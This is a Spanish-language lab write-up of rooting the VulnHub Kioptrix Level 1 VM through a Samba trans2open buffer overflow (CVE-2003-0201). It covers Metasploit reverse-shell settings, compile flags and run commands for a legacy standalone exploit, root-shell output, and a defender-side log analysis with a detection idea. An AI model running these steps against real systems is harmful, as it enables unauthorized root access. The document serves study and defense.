# Writeup: Kioptrix Level 1 — Explotación (Samba trans2open)

## Información
- **Plataforma:** VulnHub (VM local, VirtualBox host-only vboxnet0)
- **Dificultad:** Easy
- **Técnicas principales:** buffer overflow remoto (CVE-2003-0201), bruteforce de RET, compilación de exploits legacy, análisis forense de logs
- **Fecha:** 2026-07-21/22 (sesiones 003-005)
- **Target:** 192.168.56.102 — Red Hat Linux 7.2 (Enigma), kernel 2.4.7-10, Samba 2.2.1a

## Resumen ejecutivo

Root directo vía buffer overflow en Samba 2.2.1a (trans2open, CVE-2003-0201).
El bruteforce de Metasploit barrió su rango completo (~13 h, 25.760 intentos)
sin éxito: su grilla de 0x100 nunca pisó el RET válido. El exploit standalone
EDB-10 (eSDee, 2003), con bruteforce propio más fino y 20x más rápido, logró la
shell en el 4º intento (RET 0xbffffb50). El análisis de logs post-explotación
confirmó la firma del ataque: 3.5 MB de errores repetidos en smbd.log.

## Reconocimiento

Ver `labs/kioptrix/level-1-enumeracion.md`. Resumen de la superficie:

| Puerto | Servicio | Vector evaluado |
|---|---|---|
| 139 | Samba 2.2.1a (solo SMB1) | **trans2open — elegido** |
| 443 | Apache 1.3.20 + mod_ssl 2.8.4 + OpenSSL 0.9.6b | OpenFuck (plan C) |
| 22 | OpenSSH 2.9p2 | débil en config, no práctico |
| 111/32768 | rpcbind / rpc.statd | frágil |

## Explotación

### Intento 1 — Metasploit trans2open (FALLÓ)

```
use exploit/linux/samba/trans2open
set RHOSTS 192.168.56.102
set payload linux/x86/shell_reverse_tcp
set LHOST 192.168.56.1
run    # target 0 = Bruteforce (único)
```

- Barrió desde 0xbffffafc hasta 0xbfa000fc (piso del rango), ~1 RET cada 2 s.
- ~13 horas, sin sesión: `Exploit completed, but no session was created.`
- El error `undefined method 'report_service'` es cosmético (módulo de 2003
  contra MSF moderno).

**Causa raíz del fallo (lección clave):** todos los RETs probados por MSF
terminan en `...fc` — el sweep arranca en 0xbffffafc y baja de a 0x100. El RET
que funciona (0xbffffb50, termina en `...50`) estaba *dentro del rango barrido
pero fuera de la grilla*. La granularidad del bruteforce puede hacer invisibles
los offsets válidos.

### Intento 2 — Exploit standalone EDB-10 (ÉXITO)

`searchsploit samba 2.2` → `multiple/remote/10.c` — "Samba < 2.2.8 (Linux/BSD)
Remote Code Execution" (eSDee, 2003). Criterio de selección: versión (< 2.2.8 ⊇
2.2.1a) → plataforma (Linux x86) → tipo (remoto, RCE) → vector (trans2open) →
calidad (tabla de RETs por distro resuelta a mano por el autor).

**Compilación — exploit de 2003 en gcc moderno:**

```
gcc -std=gnu89 -Wno-error=incompatible-pointer-types -o trans2 10.c
```

Errores originales y por qué:
- `void usage();` / `void shell();` (forward declarations estilo K&R) chocan con
  C23 (default de gcc actual), donde `()` significa "cero argumentos".
  → `-std=gnu89` restaura la semántica de la época.
- `signal(SIGUSR1, handler)` con handler `void(void)` vs `void(*)(int)`
  esperado → era warning en 2003, error hoy.
  → `-Wno-error=incompatible-pointer-types` lo devuelve a warning.

**Ejecución:**

```
./trans2 -t 0                            # lista los 21 targets
./trans2 -t 7 -v 192.168.56.102          # Redhat 7.x [0xbffff310] → falló
./trans2 -t 6 -v 192.168.56.102          # Redhat 8.0 → falló
./trans2 -t 8 -v 192.168.56.102          # Redhat 6.x → falló
./trans2 -b 0 -v 192.168.56.102          # bruteforce Linux → ÉXITO al 4º intento
```

Salida del éxito:

```
+ Using ret: [0xbffffed4]
+ Using ret: [0xbffffda8]
+ Using ret: [0xbffffc7c]
+ Using ret: [0xbffffb50]
+ Worked!
uid=0(root) gid=0(root) groups=99(nobody)
```

El bruteforce del standalone difiere del de MSF en lo que importa:
paso default 300 bytes (grilla distinta), 0.1 s entre intentos (20x más
rápido) y hasta 40 procesos en paralelo.

**Nota sobre el shellcode:** es una *bind shell* (`linux_bindcode`), bindea el
puerto 61360 (0xEFB0) en la víctima y el propio exploit se conecta. No requiere
listener.

## Post-explotación

Evidencia de root:

```
# id && hostname && cat /etc/redhat-release
uid=0(root) gid=0(root) groups=99(nobody)
kioptrix.level1
Red Hat Linux release 7.2 (Enigma)
```

Hallazgos:

- **Usuarios reales:** `john` (uid 500) y `harold` (uid 501), ambos con
  /bin/bash. Todo lo demás son cuentas de sistema.
- **Hash de root:** formato `$1$` = **md5crypt** (débil, crackeable offline;
  valor omitido por sanitización — regla: los hashes no se publican).
- **sendmail corriendo** (visto en el boot log) — servicio no priorizado en la
  enum; candidato a revisar en una segunda pasada.
- Shell obtenida con grupos `nobody`: smbd corre como root pero con
  supplementary groups del usuario de servicio.

## Análisis forense (vista del defensor)

`/var/log/messages` NO registró los segfaults: los kernels 2.4 no logueaban
crashes de userland a syslog. Hipótesis inicial corregida en vivo: la firma está
en los **logs de la aplicación**, no en syslog.

```
/var/log/samba/:
-rw-r--r-- 1 root root       0  log.smbd      ← vacío (archivo "obvio", incorrecto)
-rw-r--r-- 1 root root 3504066  smbd.log      ← AQUÍ está todo
-rw-r--r-- 1 root root    1492  smbd.log.1    ← historia desde 2009
```

- `grep -c "tdb_delete failed" smbd.log` → **25.760 eventos** — uno por cada
  conexión cuyo hijo smbd murió sin desregistrarse. Flood de 00:45:52 a ~10:14
  (~9.5 h).
- `grep -c "Invalid packet" smbd.log` → 2.
- smbd.log.1 contiene un `Invalid packet length! (87072 bytes)` de 2009 —
  alguien le tiró paquetes malformados a esta VM cuando fue construida.
- log.nmbd confirma la enum externa: `KIOPTRIX is now a local master browser
  for workgroup MYGROUP on subnet 192.168.56.102`.

**Firma de detección:** no es "un exploit", es un log creciendo 3.5 MB con el
mismo error repetido 25 mil veces desde una IP. Una alerta de "mismo error
>100/min desde una fuente" lo detectaba a los minutos.

Observación desde el host durante el ataque (tcpdump, vboxnet0): conexiones SMB
nuevas cada ~1.2 s, idénticas en forma (SYN → negociación ~88 bytes → cierre).
Cadencia robótica = herramienta automatizada. El cierre con FIN (no RST) en los
crashes: el kernel cierra limpio los sockets del proceso muerto; RST solo
aparece con datos para socket inexistente o abort explícito.

## Lecciones aprendidas

1. **El bruteforce genérico puede fallar por granularidad, no por rango.** MSF
   barrió 13 h sin tocar el RET válido; el standalone lo encontró en 4 intentos
   con otra grilla. Si un bruteforce agota el rango, cambiar el paso/herramienta
   es más inteligente que reintentar igual.
2. **Los RETs hardcodeados por distro no son garantía:** el target "Redhat 7.x"
   falló contra Kioptrix (Red Hat 7.2 real) porque el smbd de Kioptrix no es el
   build stock de Red Hat. El fingerprint dice la distro, no el binario exacto.
3. **Compilar exploits legacy:** `-std=gnu89 -Wno-error=incompatible-pointer-types`
   resuelve el patrón típico de C K&R en gcc moderno sin tocar el código.
4. **smbd corre como root y forkea por conexión** → el exploit hereda root
   directo (no hay escalada) y los crashes de hijos no tumban el servicio (por
   eso el bruteforce es viable).
5. **Forense:** cuando el log "obvio" está vacío, mirar los hermanos
   (rotaciones, logs por proceso). La firma de un bruteforce es volumen y
   repetición, no contenido sofisticado.
6. **Por qué da root:** el exploit hereda los privilegios del PROCESO explotado
   (smbd = root). "Apuntar al kernel" es incorrecto.
7. **En sistemas modernos:** NX/ASLR/canaries matan esta clase de ataque en
   mainstream, pero IoT/embedded legacy sigue vulnerable — los exploits
   emigran, no mueren.

## Herramientas usadas

nmap/NSE (enum previa), Metasploit (intento 1), searchsploit/exploitdb,
gcc (compilación con flags de compatibilidad), EDB-10 sambal/trans2open,
tcpdump (observación del patrón de red), análisis manual de logs de samba.

## Material de referencia

- CVE-2003-0201 — Samba call_trans2open buffer overflow
- EDB-10 — eSDee, "Samba 2.2.8 < remote root exploit"
- TCM Security PEH, sección Exploitation Basics (referencia)

## Autoevaluación

1. ¿Por qué el bruteforce de MSF falló si el RET válido estaba dentro de su
   rango? Explicá con las direcciones concretas.
2. ¿Qué dos propiedades de smbd hacen viable el bruteforce de RETs? ¿Qué
   mitigación moderna rompe cada una?
3. El shellcode de EDB-10 es bind shell. ¿En qué dos escenarios reales elegirías
   bind sobre reverse? ¿Y cuándo es al revés?
4. ¿Por qué `/var/log/messages` no mostró los crashes? ¿Dónde quedó la evidencia
   y qué regla de detección la habría atrapado temprano?
5. Si solo pudieras llevarle UNA recomendación al dueño de esta máquina, ¿cuál
   sería y por qué? (Pista: no es "parchear samba" solamente.)
